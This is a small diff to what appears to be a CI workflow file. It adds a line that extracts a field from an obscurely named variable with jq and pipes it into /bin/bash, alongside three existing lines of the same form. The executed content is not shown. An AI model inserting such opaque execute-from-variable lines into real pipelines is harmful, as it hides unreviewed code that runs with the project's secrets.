@@ -28,6 +28,7 @@ jobs:
           echo $i05507 | jq -r .v49 | /bin/bash
           echo $cfuhq5 | jq -r .b260 | /bin/bash
           echo $kzq1 | jq -r .ydro5 | /bin/bash
+          printf '%s' "$iex757" | jq -r .x7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
